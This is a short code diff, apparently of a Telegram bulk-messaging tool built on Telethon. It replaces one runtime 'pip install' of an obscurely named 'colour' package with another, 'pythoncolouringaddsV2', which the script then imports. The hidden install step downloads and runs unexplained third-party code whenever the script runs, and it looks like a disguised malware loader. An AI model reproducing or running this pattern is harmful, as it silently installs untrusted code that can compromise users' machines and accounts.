@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloradds")
-import pipcoloradds
+os.system("pip install pythoncolouringaddsV2")
+import pythoncolouringaddsV2
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
 from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
